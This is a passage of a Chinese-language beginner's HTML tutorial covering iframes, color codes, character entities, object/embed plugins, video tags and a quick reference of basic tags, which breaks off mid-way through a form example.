class="hljs-string">&quot;URL&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-comment">&lt;!--该URL指向不同的网页，将窗口内容显示为URL地址指向页面。--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-设置高度与宽度"><a href="#2-1-设置高度与宽度" class="headerlink" title="2.1 设置高度与宽度"></a>2.1 设置高度与宽度</h3><p>height和width属性用来定义iframe标签的高度与宽度。属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;80%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;80%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-移除边框"><a href="#2-2-移除边框" class="headerlink" title="2.2 移除边框"></a>2.2 移除边框</h3><p>frameborder属性用于定义iframe表示是否显示边框。设置属性值为 “0” 移除iframe的边框:</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-框架页面的默认页面"><a href="#2-3-框架页面的默认页面" class="headerlink" title="2.3 框架页面的默认页面"></a>2.3 框架页面的默认页面</h3><p>iframe可以显示一个目标链接的页面，目标链接的属性必须使用iframe的属性。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframe_a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;iframe_a&quot;</span>&gt;</span>墨水的记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-颜色"><a href="#3-颜色" class="headerlink" title="3.颜色"></a>3.颜色</h2><p>HTML 颜色由一个十六进制符号来定义，这个符号由红色、绿色和蓝色的值组成（RGB）。每种颜色的最小值是 0（十六进制：#00）。最大值是 255（十六进制：#FF）。<br><strong>3位颜色十六进制：</strong>如：#000（黑色）、#F00（红色）、#0F0（绿色）等。<br><strong>6位颜色十六进制：</strong>如：#000000（黑色）、#FF0000（红色）、#00FF00（绿色）等。<br><strong>颜色RGB：</strong>如：rgb（0,0,0）（黑色）、rgb（255，0，0）（红色）、rgb（0，255，0）（绿色）等。<br><strong>颜色名字：</strong>如：Black （黑色）、red（红色）、green（绿色）等。 </p><h2 id="4-字符实体"><a href="#4-字符实体" class="headerlink" title="4.字符实体"></a>4.字符实体</h2><table><thead><tr><th align="center">显示结果</th><th align="center">描述</th><th align="center">实体名称</th><th align="center">实体编号</th></tr></thead><tbody><tr><td align="center"></td><td align="center">空格</td><td align="center">&amp;nbsp;</td><td align="center">&#160;</td></tr><tr><td align="center">&lt;</td><td align="center">小于号</td><td align="center">&amp;lt;</td><td align="center">&#60;</td></tr><tr><td align="center">&gt;</td><td align="center">大于号</td><td align="center">&amp;gt;</td><td align="center">&#62;</td></tr><tr><td align="center">&amp;</td><td align="center">和号</td><td align="center">&amp;amp;</td><td align="center">&#38;</td></tr><tr><td align="center">“</td><td align="center">引号</td><td align="center">&amp;quot;</td><td align="center">&#34;</td></tr><tr><td align="center">‘</td><td align="center">撇号</td><td align="center">&amp;apos; (IE不支持)</td><td align="center">&#39;</td></tr><tr><td align="center">￠</td><td align="center">分</td><td align="center">&amp;cent;</td><td align="center">&#162;</td></tr><tr><td align="center">£</td><td align="center">镑</td><td align="center">&amp;pound;</td><td align="center">&#163;</td></tr><tr><td align="center">¥</td><td align="center">人民币/日元</td><td align="center">&amp;yen;</td><td align="center">&#165;</td></tr><tr><td align="center">€</td><td align="center">欧元</td><td align="center">&amp;euro;</td><td align="center">&#8364;</td></tr><tr><td align="center">§</td><td align="center">小节</td><td align="center">&amp;sect;</td><td align="center">&#167;</td></tr><tr><td align="center">©</td><td align="center">版权</td><td align="center">&amp;copy;</td><td align="center">&#169;</td></tr><tr><td align="center">®</td><td align="center">注册商标</td><td align="center">&amp;reg;</td><td align="center">&#174;</td></tr><tr><td align="center">™</td><td align="center">商标</td><td align="center">&amp;trade;</td><td align="center">&#8482;</td></tr><tr><td align="center">×</td><td align="center">乘号</td><td align="center">&amp;times;</td><td align="center">&#215;</td></tr><tr><td align="center">÷</td><td align="center">除号</td><td align="center">&amp;divide;</td><td align="center">&#247;</td></tr></tbody></table><h2 id="5-插件"><a href="#5-插件" class="headerlink" title="5.插件"></a>5.插件</h2><p>插件的功能是扩展 HTML 浏览器的功能。<br>辅助应用程序（helper application）是可由浏览器启动的程序。辅助应用程序也称为插件。辅助程序可用于播放音频和视频（以及其他）。辅助程序是使用 &lt;object&gt; 标签来加载的。<br>使用辅助程序播放视频和音频的一个优势是，您能够允许用户来控制部分或全部播放设置。插件可以通过 &lt;object&gt; 标签或者 &lt;embed&gt; 标签添加在页面中。object 和 embed 元素都通过添加对浏览器不直接支持的插件的支持来扩展浏览器的功能。<br>大多数辅助应用程序允许对音量设置和播放功能（比如后退、暂停、停止和播放）的手工（或程序的）控制。</p><blockquote><p>如：可以使用 &lt;video&gt; 和 &lt;audio&gt; 标签来显示视频和音频</p></blockquote><h3 id="5-1-lt-object-gt-元素"><a href="#5-1-lt-object-gt-元素" class="headerlink" title="5.1 &lt;object&gt;元素"></a>5.1 &lt;object&gt;元素</h3><p>所有主流浏览器都支持 &lt;object&gt; 标签。&lt;object&gt; 元素定义了在 HTML 文档中嵌入的对象。&lt;object&gt; 元素具有局部属性:data，type，height，width，usemap，name，form。该标签用于插入对象 (例如在网页中嵌入 Java 小程序, PDF 阅读器, Flash 播放器) 。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;bookmark.swf&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-comment">&lt;!-- &lt;object&gt; 元素同样可用于包含HTML文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500px&quot;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;snippet.html&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-comment">&lt;!--  插入一张图片 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;logo.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-2-lt-embed-gt-元素"><a href="#5-2-lt-embed-gt-元素" class="headerlink" title="5.2 &lt;embed&gt;元素"></a>5.2 &lt;embed&gt;元素</h3><p>所有主流浏览器都支持 &lt;embed&gt; 元素。&lt;embed&gt; 元素实现与 &lt;object&gt; 元素相同的结果。<br>&lt;embed&gt; 元素表示一个 HTML Embed 对象 。<br>&lt;embed&gt; 元素已经出现很长一段时间了，但是在 HTML5 前并未被详细说明，该元素在 HTML 5 页面上会被验证，在 HTML 4 上不会。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;bookmark.swf&quot;</span> &gt;</span><br><span class="hljs-comment">&lt;!--  &lt;embed&gt; 元素同样可用于包含 HTML 文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;500px&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;snippet.html&quot;</span> &gt;</span><br><span class="hljs-comment">&lt;!-- 插入一张图片 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;logo.png&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong> &lt;embed&gt; 元素没有关闭标签。 不能使用替代文本。</p><h3 id="5-3-视频"><a href="#5-3-视频" class="headerlink" title="5.3 视频"></a>5.3 视频</h3><p>在 HTML 中播放视频的方法有很多种。可以使用 &lt;embed&gt; 标签、&lt;object&gt; 标签以及 &lt;video&gt; 标签（HTML 5中启用）。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.webm&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/webm&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.swf&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="部分知识点内容用法参考"><a href="#部分知识点内容用法参考" class="headerlink" title="部分知识点内容用法参考"></a>部分知识点内容用法参考</h1><h3 id="6-1-HTML基本标签"><a href="#6-1-HTML基本标签" class="headerlink" title="6.1 HTML基本标签"></a>6.1 HTML基本标签</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>最大的标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>最小的标题<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> （换行）<br> <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span> （水平线）<br> <span class="hljs-comment">&lt;!-- 这是注释 --&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2-文本格式化"><a href="#6-2-文本格式化" class="headerlink" title="6.2 文本格式化"></a>6.2 文本格式化</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>粗体文本<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>计算机代码<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>强调文本<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>斜体文本<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">kbd</span>&gt;</span>键盘输入<span class="hljs-tag">&lt;/<span class="hljs-name">kbd</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>预格式化文本<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>更小的文本<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>重要的文本<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">abbr</span>&gt;</span> （缩写）<br><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span> （联系信息）<br><span class="hljs-tag">&lt;<span class="hljs-name">bdo</span>&gt;</span> （文字方向）<br><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span> （从另一个源引用的部分）<br><span class="hljs-tag">&lt;<span class="hljs-name">cite</span>&gt;</span> （工作的名称）<br><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span> （删除的文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span> （插入的文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span> （下标文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span> （上标文本）<br></code></pre></div></td></tr></table></figure><h3 id="6-3-链接"><a href="#6-3-链接" class="headerlink" title="6.3 链接"></a>6.3 链接</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">普通的链接：<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;链接地址&quot;</span>&gt;</span>链接文本<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>图像链接： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.example.com/&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;external nofollow&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;URL&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;替换文本&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br>邮件链接： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailto:webmaster@example.com&quot;</span>&gt;</span>发送e-mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>书签： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tips&quot;</span>&gt;</span><br>提示部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#tips&quot;</span>&gt;</span>跳到提示部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-4-图片"><a href="#6-4-图片" class="headerlink" title="6.4 图片"></a>6.4 图片</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;URL&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;替换文本&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;42&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;42&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-5-样式-区块"><a href="#6-5-样式-区块" class="headerlink" title="6.5 样式/区块"></a>6.5 样式/区块</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>文档中的块级元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>文档中的内联元素<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-6-无序列表"><a href="#6-6-无序列表" class="headerlink" title="6.6 无序列表"></a>6.6 无序列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-7-有序列表"><a href="#6-7-有序列表" class="headerlink" title="6.7 有序列表"></a>6.7 有序列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-8-自定义列表"><a href="#6-8-自定义列表" class="headerlink" title="6.8 自定义列表"></a>6.8 自定义列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>项目 1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>描述项目 1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>项目 2<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>描述项目 2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-9-表格"><a href="#6-9-表格" class="headerlink" title="6.9 表格"></a>6.9 表格</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>表格标题<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>表格标题<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>表格数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>表格数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-10-框架"><a href="#6-10-框架" class="headerlink" title="6.10 框架"></a>6.10 框架</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-11-表单"><a href="#6-11-表单" class="headerlink" title="6.11 表单"></a>6.11 表单</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_form.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post/get&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Send&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> 